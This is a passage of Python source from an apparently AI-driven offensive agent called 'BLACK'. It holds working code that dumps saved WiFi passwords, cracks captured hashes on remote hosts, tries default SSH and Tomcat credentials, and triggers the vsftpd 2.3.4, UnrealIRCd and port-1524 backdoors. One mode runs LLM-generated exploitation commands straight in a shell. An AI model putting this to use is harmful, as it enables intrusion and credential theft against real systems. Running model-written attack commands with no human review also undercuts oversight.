                        elif 'dig ' in line.lower() and ip in line:
                            print(f"  > {line}")
                            dig_commands.append(line)
                    
                    if not dig_commands:
                        for line in dig_response.split('\n')[:10]:
                            if line.strip():
                                print(f"  {line.strip()}")
                
                if any("shadow" in str(t).lower() or "hash" in str(t).lower() for t in trophies):
                    print(f"  > crack hashes")
                    dig_commands.append("crack hashes")
                
                port_names = {
                    21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns",
                    80: "http", 110: "pop3", 111: "rpc", 139: "netbios", 143: "imap",
                    443: "https", 445: "smb", 512: "rexec", 513: "rlogin", 514: "rsh",
                    1099: "rmi", 1524: "backdoor", 2049: "nfs", 2121: "ftp-alt",
                    3306: "mysql", 3632: "distcc", 5432: "postgres", 5900: "vnc",
                    6000: "x11", 6667: "irc", 8009: "ajp", 8080: "http-alt", 8180: "tomcat"
                }
                
                for port in open_ports[:10]:
                    svc_name = port_names.get(port, f"port{port}")
                    if port not in [1524]:
                        print(f"  > dig {svc_name} {port} {ip}")
                        dig_commands.append(f"dig {svc_name} {port} {ip}")
                
                agent._dig_commands = dig_commands
                agent._findings = trophies
                
                print(f"\n[BLACK] {len(dig_commands)} areas to investigate.")
                print("[*] Type a command above, or 'auto' to run all dig commands automatically.")
                print("[*] Type 'done' to finish training session.\n")
                
                agent._trophies = trophies
                agent._training_target = ip
                continue
            
            if user_input.lower() in ["evolve", "apply modules", "create modules"]:
                if not hasattr(agent, '_module_suggestions') or not agent._module_suggestions:
                    print("\n[BLACK] No module suggestions available.")
                    print("[BLACK] Run 'train <ip>' first to generate suggestions based on findings.")
                    continue
                
                print("\n" + "=" * 60)
                print("MODULE EVOLUTION")
                print("=" * 60)
                
                created = 0
                improved = 0
                
                for suggestion in agent._module_suggestions:
                    if suggestion["action"] == "create":
                        module_name = suggestion["module_name"]
                        description = suggestion.get("description", f"Auto-generated module for {module_name}")
                        patterns = suggestion.get("patterns", [])
                        
                        print(f"\n[CREATE] Creating module: {module_name}")
                        print(f"  Description: {description}")
                        print(f"  Patterns: {len(patterns)}")
                        
                        result = agent.write_module(module_name, description, patterns)
                        if result.get("success"):
                            print(f"  [+] SUCCESS: {result.get('module_path')}")
                            created += 1
                        else:
                            print(f"  [-] FAILED: {result.get('error')}")
                    
                    elif suggestion["action"] == "improve":
                        module_name = suggestion["module_name"]
                        new_patterns = suggestion.get("new_patterns", [])
                        
                        print(f"\n[IMPROVE] Enhancing module: {module_name}")
                        print(f"  New patterns: {len(new_patterns)}")
                        
                        result = agent.improve_module(module_name, new_patterns=new_patterns)
                        if result.get("success"):
                            print(f"  [+] SUCCESS: {result.get('module_path')}")
                            print(f"  [+] Backup: {result.get('backup_path')}")
                            improved += 1
                        else:
                            print(f"  [-] FAILED: {result.get('error')}")
                
                print(f"\n[EVOLUTION COMPLETE]")
                print(f"  Modules created: {created}")
                print(f"  Modules improved: {improved}")
                
                agent._module_suggestions = []
                continue
            
            if user_input.lower() == "modules":
                print("\n[BLACK] Available LANTERN modules:")
                modules = agent.get_available_modules()
                for i, mod in enumerate(modules, 1):
                    print(f"  {i:2}. {mod}")
                print(f"\n  Total: {len(modules)} modules")
                continue
            
            if user_input.lower() == "lessons":
                print("\n[BLACK] Lessons learned:")
                lessons_file = agent.knowledge_path / "lessons_learned.json"
                if lessons_file.exists():
                    import json
                    with open(lessons_file, "r") as f:
                        data = json.load(f)
                    for lesson in data.get("lessons", [])[-10:]:
                        print(f"\n  [{lesson.get('id')}] {lesson.get('target')}")
                        print(f"    {lesson.get('lesson')}")
                        print(f"    Techniques: {', '.join(lesson.get('techniques', []))}")
                    print(f"\n  Total lessons: {len(data.get('lessons', []))}")
                    print(f"  Attack chains: {len(data.get('attack_chains', []))}")
                else:
                    print("  No lessons recorded yet.")
                continue
            
            if user_input.lower() == "learning":
                print("\n[BLACK] Full Learning Summary:")
                summary = agent.show_learning_summary()
                print(summary)
                continue
            
            if user_input.lower() == "improvements":
                print("\n[BLACK] LANTERN Improvement Report:")
                report = agent.get_improvement_report()
                print(report)
                continue
            
            if user_input.lower().startswith("smart probe "):
                url = user_input.split(" ", 2)[2] if len(user_input.split(" ")) > 2 else ""
                if not url:
                    print("[BLACK] Usage: smart probe <url>")
                    continue
                print(f"\n[BLACK] Running smart probe on {url}...")
                print("[*] This performs deep vulnerability probing with learning...")
                result = agent.run_smart_probe_on_target(url)
                if result.get("success"):
                    print("\n[PROBE RESULTS]")
                    probe_data = result.get("result", {})
                    print(f"  Findings: {probe_data.get('total_findings', 'N/A')}")
                    print(f"  Flags: {probe_data.get('flags_found', [])}")
                    if probe_data.get("improvements"):
                        print(f"  Improvements suggested: {len(probe_data.get('improvements', []))}")
                else:
                    print(f"  [-] Error: {result.get('error')}")
                continue
            
            if user_input.lower() == "apply improvements":
                print("\n[BLACK] Applying improvements to LANTERN...")
                result = agent.apply_lantern_improvements()
                print(result)
                continue
            
            if user_input.lower() == "diff improvements":
                print("\n[BLACK] Showing improvement diff...")
                result = agent.show_improvement_diff()
                print(result)
                continue
            
            # WiFi scanning (Windows)
            if user_input.lower() == "wifi" or user_input.lower() == "wifi scan":
                print("\n[BLACK] Scanning nearby WiFi networks (Windows)...")
                result = agent.execute_command("netsh wlan show networks mode=bssid")
                if result["success"]:
                    print(f"[WIFI NETWORKS]\n{result['stdout']}")
                else:
                    print(f"[ERROR] {result.get('error', 'WiFi scan failed')}")
                continue
            
            # WiFi passwords (Windows)
            if user_input.lower() in ["wifi passwords", "wifi password", "saved wifi", "wifi saved"]:
                print("\n[BLACK] Extracting saved WiFi passwords...")
                ps_cmd = '''
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
foreach ($profile in $profiles) {
    $details = netsh wlan show profile name="$profile" key=clear 2>$null
    $key = ($details | Select-String "Key Content") -replace ".*: ", ""
    if ($key) {
        Write-Output "$profile : $key"
    } else {
        Write-Output "$profile : (no password saved)"
    }
}
'''
                result = agent.execute_command(f'powershell -Command "{ps_cmd}"', timeout=30)
                if result["success"]:
                    print(f"[SAVED WIFI PASSWORDS]\n{result['stdout']}")
                else:
                    print(f"[ERROR] {result.get('error', 'Failed to get passwords')}")
                continue
            
            # exec <cmd> - Direct shell execution
            if user_input.lower().startswith("exec "):
                cmd = user_input[5:].strip()
                if cmd:
                    print(f"\n[BLACK] Executing: {cmd}")
                    result = agent.execute_command(cmd, timeout=60)
                    if result["success"]:
                        print(f"[OUTPUT]\n{result['stdout']}")
                        if result.get('stderr'):
                            print(f"[STDERR]\n{result['stderr']}")
                    else:
                        print(f"[ERROR] {result.get('error', 'Command failed')}")
                else:
                    print("[BLACK] Usage: exec <command>")
                continue
            
            if user_input.lower().startswith("ports "):
                target = user_input[6:].strip()
                if target:
                    print(f"\n[BLACK] Scanning common ports on {target}...")
                    import socket
                    common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 
                                   993, 995, 1433, 1521, 2049, 3306, 3389, 5432, 5900, 5985, 
                                   6379, 8080, 8443, 9090, 27017]
                    open_ports = []
                    for port in common_ports:
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(0.5)
                            if s.connect_ex((target, port)) == 0:
                                open_ports.append(port)
                                print(f"  [+] Port {port}: OPEN")
                            s.close()
                        except Exception:
                            pass
                    if open_ports:
                        print(f"\n[RESULT] Found {len(open_ports)} open ports: {open_ports}")
                    else:
                        print(f"\n[RESULT] No common ports open on {target}")
                else:
                    print("[BLACK] Usage: ports <ip>")
                continue
            
            # dig <service> <port> <ip> - Deep dive into a service
            if user_input.lower().startswith("dig "):
                parts = user_input.split()
                if len(parts) >= 4:
                    svc = parts[1].lower()
                    try:
                        port = int(parts[2])
                    except:
                        port = 0
                    target = parts[3]
                    
                    print(f"\n[BLACK] Deep diving into {svc} on {target}:{port}...")
                    print("-" * 50)
                    
                    import socket
                    
                    # Service-specific probes
                    if svc in ["http", "web", "http-alt"] or port in [80, 8080, 8000, 8443, 443]:
                        print("[*] HTTP service detected - probing...")
                        try:
                            import urllib.request
                            url = f"http://{target}:{port}" if port not in [443, 8443] else f"https://{target}:{port}"
                            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                            resp = urllib.request.urlopen(req, timeout=5)
                            print(f"  [+] Status: {resp.status}")
                            print(f"  [+] Server: {resp.headers.get('Server', 'Unknown')}")
                            print(f"  [+] Content-Type: {resp.headers.get('Content-Type', 'Unknown')}")
                            body = resp.read(2000).decode(errors='ignore')
                            if '<title>' in body.lower():
                                import re
                                title = re.search(r'<title[^>]*>([^<]+)</title>', body, re.I)
                                if title:
                                    print(f"  [+] Title: {title.group(1)}")
                        except Exception as e:
                            print(f"  [-] HTTP probe failed: {e}")
                        
                        # Directory brute
                        print("\n[*] Checking common paths...")
                        paths = ["/robots.txt", "/sitemap.xml", "/.git/HEAD", "/admin", "/login", 
                                "/api", "/phpinfo.php", "/.env", "/wp-admin", "/manager/html"]
                        for path in paths:
                            try:
                                url = f"http://{target}:{port}{path}"
                                req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                                resp = urllib.request.urlopen(req, timeout=2)
                                print(f"  [+] Found: {path} (status {resp.status})")
                            except urllib.error.HTTPError as e:
                                if e.code in [401, 403]:
                                    print(f"  [!] Protected: {path} ({e.code})")
                            except:
                                pass
                    
                    elif svc in ["ssh"] or port == 22:
                        print("[*] SSH service - grabbing banner...")
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(5)
                            s.connect((target, port))
                            banner = s.recv(1024).decode(errors='ignore').strip()
                            s.close()
                            print(f"  [+] Banner: {banner}")
                            if "OpenSSH" in banner:
                                ver = banner.split("_")[1].split(" ")[0] if "_" in banner else "unknown"
                                print(f"  [*] OpenSSH version: {ver}")
                        except Exception as e:
                            print(f"  [-] SSH probe failed: {e}")
                    
                    elif svc in ["ftp"] or port == 21:
                        print("[*] FTP service - checking anonymous login...")
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(5)
                            s.connect((target, port))
                            banner = s.recv(1024).decode(errors='ignore').strip()
                            print(f"  [+] Banner: {banner}")
                            s.send(b"USER anonymous\r\n")
                            resp1 = s.recv(1024).decode(errors='ignore')
                            s.send(b"PASS anonymous@\r\n")
                            resp2 = s.recv(1024).decode(errors='ignore')
                            if "230" in resp2:
                                print(f"  [+] Anonymous login ALLOWED!")
                            else:
                                print(f"  [-] Anonymous login denied")
                            s.close()
                        except Exception as e:
                            print(f"  [-] FTP probe failed: {e}")
                    
                    elif svc in ["mysql", "mariadb"] or port == 3306:
                        print("[*] MySQL service - checking root no password...")
                        result = agent.execute_command(f'mysql -h {target} -u root -e "SELECT version();" 2>&1', timeout=10)
                        if "denied" in result.get('stdout', '').lower():
                            print(f"  [-] Root access denied (password required)")
                        elif result.get('stdout'):
                            print(f"  [+] MySQL root NO PASSWORD!\n  {result['stdout'][:200]}")
                        else:
                            print(f"  [-] MySQL connection failed")
                    
                    elif svc in ["smb", "samba", "netbios"] or port in [139, 445]:
                        print("[*] SMB service - enumerating shares...")
                        result = agent.execute_command(f'smbclient -L //{target} -N 2>&1', timeout=15)
                        if result.get('stdout'):
                            print(f"  {result['stdout'][:500]}")
                        else:
                            print(f"  [-] SMB enumeration failed (try: smbclient -L //{target} -N)")
                    
                    elif svc in ["redis"] or port == 6379:
                        print("[*] Redis service - checking unauthenticated access...")
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(5)
                            s.connect((target, port))
                            s.send(b"INFO\r\n")
                            resp = s.recv(4096).decode(errors='ignore')
                            s.close()
                            if "redis_version" in resp:
                                print(f"  [+] Redis UNAUTHENTICATED ACCESS!")
                                for line in resp.split('\n')[:10]:
                                    if line.strip():
                                        print(f"    {line.strip()}")
                            else:
                                print(f"  [-] Redis requires auth or connection blocked")
                        except Exception as e:
                            print(f"  [-] Redis probe failed: {e}")
                    
                    else:
                        # Generic banner grab
                        print(f"[*] Generic probe for {svc}...")
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(5)
                            s.connect((target, port))
                            s.send(b"\r\n")
                            banner = s.recv(2048).decode(errors='ignore').strip()
                            s.close()
                            if banner:
                                print(f"  [+] Banner: {banner[:200]}")
                            else:
                                print(f"  [-] No banner received")
                        except Exception as e:
                            print(f"  [-] Probe failed: {e}")
                else:
                    print("[BLACK] Usage: dig <service> <port> <ip>")
                    print("  Example: dig http 80 <target-ip>")
                    print("  Example: dig ssh 22 <target-ip>")
                continue
            
            # crack hashes - Standalone hash cracking
            if user_input.lower() in ["crack hashes", "crack", "crack hash"]:
                hash_file = Path(__file__).parent / "training_hashes.txt"
                
                if not hash_file.exists():
                    # Check for hashes captured in session
                    trophies = getattr(agent, '_trophies', [])
                    hash_trophies = [t for t in trophies if t[0] == "HASHES"]
                    if hash_trophies:
                        print("[*] Found hashes from training session, saving to file...")
                        with open(hash_file, 'w') as f:
                            for _, name, data in hash_trophies:
                                # Extract hash lines
                                for line in str(data).split('\n'):
                                    if '$' in line and ':' in line:
                                        f.write(line.split(':')[1] if ':' in line else line)
                                        f.write('\n')
                    else:
                        print("[BLACK] No hashes to crack.")
                        print("  Options:")
                        print("    1. Run 'train <ip>' first to capture hashes")
                        print("    2. Create training_hashes.txt with hashes (one per line)")
                        continue
                
                print(f"\n[BLACK] Cracking hashes from {hash_file}...")
                
                # Read hashes
                with open(hash_file, 'r') as f:
                    hashes = f.read().strip()
                
                if not hashes:
                    print("[-] Hash file is empty")
                    continue
                
                print(f"[*] Found {hashes.count(chr(10)) + 1} hash(es)")
                
                # Try john via SSH to Kali first
                print("[*] Attempting crack via remote Kali host...")
                try:
                    result = agent.kali_exec( 
                        f"echo '{hashes}' > /tmp/hashes.txt && "
                        f"john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt 2>&1; "
                        f"echo '---CRACKED---'; john --show /tmp/hashes.txt 2>&1")
                    if result.get("success"):
                        print(f"[JOHN OUTPUT]\n{result['stdout']}")
                    else:
                        raise Exception("SSH failed")
                except Exception as e:
                    print(f"[-] Kali crack failed: {e}")
                    print("[*] Trying hashcat locally...")
                    result = agent.execute_command(
                        f'hashcat -m 500 -a 0 "{hash_file}" wordlists\\rockyou.txt --force 2>&1', 
                        timeout=120)
                    if result.get("success"):
                        print(f"[HASHCAT OUTPUT]\n{result['stdout']}")
                    else:
                        print("[-] Hashcat not available. Install hashcat or use Kali Pi.")
                continue
            
            # auto <ip:port> - Auto-exploit specific target
            if user_input.lower().startswith("auto ") and ":" in user_input:
                parts = user_input[5:].strip().split(":")
                if len(parts) == 2:
                    target = parts[0]
                    try:
                        port = int(parts[1])
                    except:
                        print("[BLACK] Usage: auto <ip:port>")
                        continue
                    
                    print(f"\n[BLACK] Auto-exploiting {target}:{port}...")
                    print("=" * 50)
                    
                    import socket
                    
                    # Determine service and run exploits
                    if port == 21:
                        print("[*] FTP - trying vsftpd 2.3.4 backdoor...")
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(5)
                            s.connect((target, 21))
                            banner = s.recv(1024).decode(errors='ignore')
                            print(f"  Banner: {banner.strip()}")
                            if "2.3.4" in banner:
                                s.send(b"USER backdoor:)\r\n")
                                s.recv(1024)
                                s.send(b"PASS x\r\n")
                                s.close()
                                import time
                                time.sleep(1)
                                bs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                bs.settimeout(3)
                                try:
                                    bs.connect((target, 6200))
                                    bs.send(b"id\n")
                                    resp = bs.recv(1024).decode(errors='ignore')
                                    if "uid=" in resp:
                                        print(f"  [+] BACKDOOR SHELL ON 6200!")
                                        print(f"  {resp}")
                                    bs.close()
                                except:
                                    print("  [-] Backdoor didn't trigger")
                            s.close()
                        except Exception as e:
                            print(f"  [-] FTP exploit failed: {e}")
                    
                    elif port == 22:
                        print("[*] SSH - trying default credentials...")
                        creds = [("root", "root"), ("admin", "admin"), ("msfadmin", "msfadmin")]
                        for user, passwd in creds:
                            result = agent.execute_command(
                                f'sshpass -p {passwd} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {user}@{target} "id" 2>&1',
                                timeout=10)
                            if "uid=" in result.get('stdout', ''):
                                print(f"  [+] SSH LOGIN: {user}:{passwd}")
                                print(f"  {result['stdout']}")
                                break
                        else:
                            print("  [-] Default creds failed")
                    
                    elif port in [80, 8080, 8180]:
                        print("[*] HTTP - checking for known vulns...")
                        import urllib.request
                        # Tomcat manager
                        if port == 8180:
                            import base64
                            creds = base64.b64encode(b"tomcat:tomcat").decode()
                            try:
                                req = urllib.request.Request(
                                    f"http://{target}:{port}/manager/html",
                                    headers={"Authorization": f"Basic {creds}"})
                                resp = urllib.request.urlopen(req, timeout=5)
                                if resp.status == 200:
                                    print(f"  [+] TOMCAT MANAGER: tomcat:tomcat")
                            except:
                                print("  [-] Tomcat manager not accessible")
                    
                    elif port == 1524:
                        print("[*] Port 1524 - checking for backdoor...")
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(5)
                            s.connect((target, 1524))
                            s.send(b"id\n")
                            resp = s.recv(1024).decode(errors='ignore')
                            if "uid=" in resp:
                                print(f"  [+] BACKDOOR SHELL!")
                                print(f"  {resp}")
                            s.close()
                        except Exception as e:
                            print(f"  [-] No backdoor: {e}")
                    
                    elif port == 6667:
                        print("[*] IRC - trying UnrealIRCd backdoor...")
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(5)
                            s.connect((target, 6667))
                            s.recv(1024)
                            s.send(b"AB; id\n")
                            import time
                            time.sleep(1)
                            resp = s.recv(4096).decode(errors='ignore')
                            if "uid=" in resp:
                                print(f"  [+] UNREALIRCD BACKDOOR!")
                                print(f"  {resp}")
                            s.close()
                        except Exception as e:
                            print(f"  [-] IRC exploit failed: {e}")
                    
                    elif port == 3306:
                        print("[*] MySQL - trying root no password...")
                        result = agent.execute_command(f'mysql -h {target} -u root -e "SELECT version();" 2>&1', timeout=10)
                        if result.get('stdout') and "denied" not in result['stdout'].lower():
                            print(f"  [+] MYSQL ROOT NO PASSWORD!")
                            print(f"  {result['stdout'][:200]}")
                        else:
                            print("  [-] MySQL requires password")
                    
                    else:
                        print(f"[*] No auto-exploit for port {port}")
                        print(f"[*] Try: dig <service> {port} {target}")
                continue
            
            if user_input.lower() == "auto":
                dig_commands = getattr(agent, '_dig_commands', [])
                if not dig_commands:
                    print("[BLACK] No dig commands queued. Run 'train <ip>' first.")
                    continue
                
                print(f"\n[BLACK] AUTO-EXECUTING {len(dig_commands)} dig commands...")
                print("=" * 60)
                
                for i, cmd in enumerate(dig_commands[:5], 1):
                    print(f"\n[AUTO {i}/{min(5, len(dig_commands))}] Running: {cmd}")
                    print("-" * 40)
                    
                    if cmd == "crack hashes":
                        hash_file = Path(__file__).parent / "training_hashes.txt"
                        if hash_file.exists():
                            print("[*] Cracking via remote Kali host...")
                            try:
                                from pi_integration.kali_bridge import KaliBridge
                                kali = KaliBridge()
                                if kali.connect():
                                    with open(hash_file, 'r') as f:
                                        hashes = f.read()
                                    kali.execute(f"echo '{hashes}' > /tmp/hashes.txt")
                                    result = kali.execute("john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt /tmp/hashes.txt 2>&1; john --show /tmp/hashes.txt", timeout=60)
                                    if result:
                                        for line in result.split('\n')[:15]:
                                            if line.strip():
                                                print(f"  {line}")
                                    kali.disconnect()
                                else:
                                    print("  [-] Kali Pi not available")
                            except Exception as e:
                                print(f"  [-] Remote crack failed: {e}")
                        else:
                            print("No hash file found")
                    elif cmd.startswith("dig "):
                        parts = cmd.split()
                        if len(parts) >= 4:
                            svc, port, target = parts[1], parts[2], parts[3]
                            print(f"[*] Investigating {svc} on {target}:{port}...")
                            
                            import socket
                            try:
                                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                s.settimeout(5)
                                s.connect((target, int(port)))
                                if int(port) in [80, 8080, 8180]:
                                    s.send(f"HEAD / HTTP/1.0\r\nHost: {target}\r\n\r\n".encode())
                                banner = s.recv(2048).decode(errors='ignore')
                                s.close()
                                print(f"  [BANNER] {banner[:200]}")
                            except Exception as e:
                                print(f"  [-] Connection failed: {e}")
                
                print(f"\n[BLACK] Auto-execution complete. Run 'train <ip>' for another target.")
                continue
            
            if user_input.lower().startswith("dig "):
                parts = user_input.split(maxsplit=3)
                if len(parts) < 4:
                    print("[BLACK] Usage: dig <service> <port> <ip>")
                    continue
                
                service = parts[1]
                port = parts[2]
                target_ip = parts[3].split()[0]
                
                import socket
                import time
                
                print(f"\n[BLACK] Digging into {service} on {target_ip}:{port}")
                print("=" * 50)
                
                print(f"[*] Grabbing banner...")
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    s.connect((target_ip, int(port)))
                    if port in ['80', '8080', '8180', '443']:
                        s.send(f"HEAD / HTTP/1.0\r\nHost: {target_ip}\r\n\r\n".encode())
                    banner = s.recv(2048).decode(errors='ignore')
                    s.close()
                    print(f"  [BANNER] {banner[:200]}")
                except Exception as e:
                    banner = f"Connection error: {e}"
                    print(f"  [-] {banner}")
                
                findings = getattr(agent, '_findings', [])
                relevant = [f for f in findings if port in str(f) or service.lower() in str(f).lower()]
                
                exploit_prompt = f"""Target: {target_ip}:{port}
Service: {service}
Banner: {banner[:300]}
Previous findings: {relevant[:5]}

What specific exploitation techniques should I try for this service?
Give me:
1. Exact commands I can run (nmap scripts, netcat, curl, etc)
2. Default credentials to try if applicable
3. Known CVEs for this service version
4. Any backdoors or misconfigurations to check

Be specific - include actual commands, not just descriptions."""

                print(f"\n[*] Analyzing attack vectors...")
                exploit_advice = agent.think(exploit_prompt)
                print(f"\n[BLACK's Analysis]")
                print(exploit_advice)
                
                if 'command' in exploit_advice.lower() or 'run' in exploit_advice.lower():
                    print(f"\n[*] Want me to execute suggested commands? Type: auto {target_ip}:{port}")
                
                continue
            
            if user_input.lower().startswith("auto "):
                target = user_input.split()[1]
                if ':' in target:
                    target_ip, port = target.split(':')
                else:
                    target_ip = target
                    port = "0"
                
                print(f"\n[BLACK] Auto-executing discovered attack vectors on {target_ip}:{port}")
                
                auto_prompt = f"""For {target_ip}:{port}, generate a series of shell commands to:
1. Test for vulnerabilities
2. Try default credentials
3. Attempt exploitation

Output ONLY executable commands, one per line, prefixed with CMD:
Example:
CMD: nmap -sV -sC -p {port} {target_ip}
CMD: curl http://{target_ip}:{port}/
"""
                
                commands_response = agent.think(auto_prompt)
                
                for line in commands_response.split('\n'):
                    if line.strip().startswith('CMD:'):
                        cmd = line.replace('CMD:', '').strip()
                        print(f"\n  [EXEC] {cmd}")
                        result = agent.execute_command(cmd, timeout=30)
                        out = result.get('stdout', '') + result.get('stderr', '')
                        if out:
                            print(f"  {out[:500]}")
                        if 'uid=' in out or 'root' in out.lower():
                            print(f"  [+] *** POSSIBLE SHELL/ACCESS! ***")
                
                continue
            
            if user_input.lower() == "crack hashes":
                print("\n[BLACK] Cracking captured hashes using remote GPU...")
                hash_file = Path(__file__).parent / "training_hashes.txt"
                if not hash_file.exists():
                    print("  [-] No hash file found. Run 'train <ip>' first to capture hashes.")
                    continue
                
                print(f"  [*] Hash file: {hash_file}")
                with open(hash_file, 'r') as f:
                    hashes = f.read()
                print(f"  [*] Hashes to crack:\n{hashes[:500]}")
                
                print("\n  [*] Attempting GPU-accelerated cracking...")
                
                try:
                    import paramiko
                    import os
                    
                    gpu_host = agent.config.gpu_host or os.environ.get("BLACK_GPU_HOST")
                    gpu_user = agent.config.gpu_user or os.environ.get("BLACK_GPU_USER") or os.environ.get("USERNAME") or os.environ.get("USER")
                    
                    if not gpu_host:
                        raise Exception("No GPU host configured. Set BLACK_GPU_HOST env var or configure in config/config.yaml")
                    
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(gpu_host, username=gpu_user, password="")
                    
                    print(f"  [+] Connected to GPU host ({gpu_host})")
                    
                    stdin, stdout, stderr = ssh.exec_command('where hashcat 2>&1 || which hashcat 2>&1')
                    hashcat_check = stdout.read().decode()
                    
                    if 'hashcat' in hashcat_check.lower() and 'not found' not in hashcat_check.lower():
                        print("  [+] hashcat found! Using GPU acceleration...")
                        
                        import tempfile
                        remote_hash_path = f"/tmp/hashes_{os.getpid()}.txt"
                        remote_wordlist = os.environ.get("BLACK_WORDLIST", "/usr/share/wordlists/rockyou.txt")
                        
                        sftp = ssh.open_sftp()
                        sftp.put(str(hash_file), remote_hash_path)
                        sftp.close()
                        
                        cmd = f'hashcat -m 500 -a 0 {remote_hash_path} {remote_wordlist} --force -O 2>&1'
                        stdin, stdout, stderr = ssh.exec_command(cmd, timeout=120)
                        result = stdout.read().decode() + stderr.read().decode()
                        
                        print(f"  [HASHCAT GPU OUTPUT]")
                        for line in result.split('\n')[-30:]:
                            if line.strip():
                                print(f"    {line}")
                    else:
                        print("  [-] hashcat not found, falling back to john...")
                        raise Exception("hashcat not found")
                    
                    ssh.close()
                    
                except Exception as e:
                    print(f"  [*] GPU node unavailable ({e}), trying local or Kali...")
                    
                    try:
                        from pi_integration.kali_bridge import KaliBridge
                        kali = KaliBridge()
                        if kali.connect():
                            print(f"  [+] Connected to Kali node")
                            
                            kali.execute(f"echo '{hashes}' > /tmp/hashes.txt")
                            
                            print("  [*] Running john...")
                            result = kali.execute(
                                "john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt /tmp/hashes.txt 2>&1",
                                timeout=120
                            )
                            if result:
                                print(f"  [JOHN CRACKING]")
                                for line in result.split('\n')[:20]:
                                    if line.strip():
                                        print(f"    {line}")
                            
                            show_result = kali.execute("john --show /tmp/hashes.txt 2>&1")
                            if show_result and ':' in show_result:
                                print(f"\n  [+] *** CRACKED PASSWORDS ***")
                                for line in show_result.split('\n'):
                                    if ':' in line and line.strip():
                                        print(f"    {line}")
                            else:
                                print("  [*] No passwords cracked yet (try longer wordlist)")
                            
                            kali.disconnect()
                        else:
                            print("  [-] Could not connect to Kali node")
                    except Exception as e2:
                        print(f"  [-] Remote connection failed: {e2}")
                        print("  [*] Manual options:")
                        print(f"      1. Copy hashes: scp {hash_file} user@kali-host:/tmp/")
                        print(f"      2. On Kali: john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt")
                
                continue
            
            if user_input.lower().startswith("attack ") and hasattr(agent, '_attack_plan'):
                try:
                    num = int(user_input.split()[1]) - 1
                    if 0 <= num < len(agent._attack_plan):
                        name, port, desc = agent._attack_plan[num]
                        ip = agent._target_ip
                        print(f"\n[BLACK] Executing attack: {name} on {ip}:{port}")
                        
                        if name == "BACKDOOR":
                            print(f"[*] Connecting to backdoor on port 1524...")
                            print(f"[*] Run manually: nc {ip} 1524")
                            r = agent.execute_command(f"echo id | nc -w 3 {ip} 1524")
                            print(r.get('stdout', r.get('error', 'No response')))
                        elif name == "TELNET":
                            print(f"[*] Try: telnet {ip}")
                            print("[*] Creds to try: msfadmin:msfadmin, root:root, user:user")
                        elif name == "FTP":
                            print(f"[*] Checking FTP anonymous login...")
                            import socket
                            try:
                                s = socket.socket()
                                s.settimeout(5)
                                s.connect((ip, 21))
                                banner = s.recv(1024).decode()
                                print(f"[BANNER] {banner.strip()}")
                                if "vsftpd 2.3.4" in banner:
                                    print("[!] vsftpd 2.3.4 DETECTED - BACKDOOR VULNERABLE!")
                                    print("[*] Exploit: Send user with :) smiley to trigger backdoor on port 6200")
                                s.close()
                            except Exception as e:
                                print(f"[!] Error: {e}")
                        elif name == "SMB":
                            print(f"[*] Samba might be vulnerable to usermap_script")
                            print(f"[*] Use: msfconsole -x 'use exploit/multi/samba/usermap_script; set RHOSTS {ip}; run'")
                        elif name == "DISTCC":
                            print(f"[*] DistCC is vulnerable to CVE-2004-2687")
                            print(f"[*] Use: msfconsole -x 'use exploit/unix/misc/distcc_exec; set RHOSTS {ip}; run'")
                        elif name == "IRC":
                            print(f"[*] UnrealIRCd 3.2.8.1 has a backdoor")
                            print(f"[*] Use: msfconsole -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS {ip}; run'")
                        elif name == "RLOGIN":
                            print(f"[*] Try: rlogin -l root {ip}")
                            print("[*] If .rhosts is misconfigured, instant root!")
                    else:
                        print(f"[!] Invalid attack number. Use 1-{len(agent._attack_plan)}")
                except ValueError:
                    print("[!] Usage: attack <number>")
                continue
            
            if user_input.lower().startswith("exec "):
                cmd = user_input[5:].strip()
                print(f"\n[BLACK] Executing: {cmd}")
                result = agent.execute_command(cmd)
                if result["success"]:
                    print(f"[OUTPUT]\n{result['stdout']}")
                else:
                    print(f"[ERROR] {result.get('stderr', result.get('error', 'Unknown error'))}")
                continue
            
            lower = user_input.lower()
            
            if any(x in lower for x in ["wifi", "wireless", "wlan", "ssid", "bssid"]):
                if "password" in lower or "saved" in lower or "profile" in lower:
                    print("\n[BLACK] Extracting saved WiFi passwords...")
                    result = agent.execute_command('netsh wlan show profiles')
                    if result["success"]:
                        import re
                        profiles = re.findall(r'All User Profile\s*:\s*(.+)', result["stdout"])
                        print(f"[SAVED NETWORKS] Found {len(profiles)} profiles")
                        for profile in profiles[:10]:
                            profile = profile.strip()
                            pwd_result = agent.execute_command(f'netsh wlan show profile name="{profile}" key=clear')
                            if pwd_result["success"]:
                                key_match = re.search(r'Key Content\s*:\s*(.+)', pwd_result["stdout"])
                                if key_match:
                                    print(f"  {profile}: {key_match.group(1).strip()}")
                                else:
                                    print(f"  {profile}: (no password/open)")
                    continue
                else:
